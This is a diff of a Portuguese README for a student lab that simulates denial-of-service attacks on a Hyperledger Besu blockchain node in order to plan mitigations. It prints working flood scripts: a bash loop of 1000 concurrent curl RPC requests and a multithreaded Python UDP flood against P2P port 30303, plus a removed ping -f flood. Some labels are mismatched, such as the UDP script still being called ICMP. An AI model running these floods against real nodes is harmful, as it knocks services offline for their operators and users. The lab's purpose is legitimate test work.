@@ -30,8 +30,8 @@ projeto-dos-besu/
 │   └── besu-config.toml      # Configurações personalizadas do Besu
 │
 ├── scripts/
-│   ├── stress_rpc.py         # Script para gerar carga RPC (camada de aplicação)
-│   ├── ping_flood.sh         # Script simples de DoS de rede (ping flood)
+│   ├── flood_network.py         # Script simples de DoS de rede (ping flood)
+│   ├── rpc_overload.sh         # Script para gerar carga RPC (camada de aplicação)
 │   └── metrics_rpc.py        # Script para medir o tempo médio de resposta RPC
 │
 └── README.md
@@ -92,27 +92,31 @@ Tempo médio de resposta RPC: 0.045 segundos
 
 ---
 
-### 4. Simular ataque DoS na camada de aplicação
+### 4. Simular ataque DoS na camada de aplicação – Sobrecarga RPC
 
 Abra outro terminal e rode:
 
 ```bash
-python3 scripts/stress_rpc.py
+bash scripts/rpc_overload.sh
 ```
 
-Esse script envia centenas de requisições RPC simultâneas (por exemplo, `eth_blockNumber`).
+Esse script envia centenas de requisições RPC simultâneas (`eth_blockNumber`).
+🧠 Efeito esperado:
+O nó Besu começa a responder mais lentamente e pode travar se o ataque persistir.
 
 ---
 
-### 5. Simular ataque à camada de rede
+### 5. Simular ataque à camada de rede – Flooding P2P
 
 Em outro terminal (ou container):
 
 ```bash
-bash scripts/ping_flood.sh
+python3 scripts/flood_network.py
 ```
 
-> Este script envia pacotes ICMP em alta frequência ao container do Besu (somente para ambiente de teste).
+> Este script simula um ataque de inundação de pacotes na porta P2P (30303).
+> 🧠 Efeito esperado:
+A porta P2P do Besu será inundada, elevando uso de CPU e travando conexões de peers.
 
 ---
 
@@ -159,38 +163,41 @@ print(f"Tempo médio de resposta RPC: {statistics.mean(tempos):.3f} segundos")
 
 ---
 
-### `stress_rpc.py`
+### `rpc_overload.sh`
 
 Simula ataque de sobrecarga RPC.
 
-```python
-import requests, threading
-
-url = "http://localhost:8545"
-payload = {"jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": 1}
-
-def flood():
-    while True:
-        try:
-            requests.post(url, json=payload, timeout=1)
-        except:
-            pass
-
-for _ in range(50):  # 50 threads simultâneas
-    threading.Thread(target=flood, daemon=True).start()
+```bash
+#!/bin/bash
+for i in {1..1000}
+do
+  curl -s -X POST http://127.0.0.1:8545 \
+  -H "Content-Type: application/json" \
+  -d '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["latest", true],"id":1}' &
+done
 ```
 
 ---
 
-### `ping_flood.sh`
+### `flood_network.py`
 
 Ataque de inundação ICMP (rede).
 
-```bash
-#!/bin/bash
-IP_CONTAINER=$(sudo docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' besu-node)
-echo "Enviando pacotes ICMP para $IP_CONTAINER"
-ping -f -s 1400 $IP_CONTAINER
+```python
+import socket
+import threading
+
+target_ip = "127.0.0.1"
+target_port = 30303
+
+def flood():
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    data = b"A" * 1024
+    while True:
+        client.sendto(data, (target_ip, target_port))
+
+for i in range(50):  # número de threads simulando bots
+    threading.Thread(target=flood).start()
 ```
 
 ---
@@ -216,4 +223,4 @@ Os resultados podem ser usados para planejar **mitigações** (como firewalls, r
 **João Filho**
 Residente em Cibersegurança – PUCPR
 Foco: GRC, Blockchain e Segurança Cibernética
-📧 contato: [seu-email@exemplo.com](mailto:seu-email@exemplo.com)
+📧 contato: [joaofilho1467@gmail.com](mailto:joaofilho1467@gmail.com)
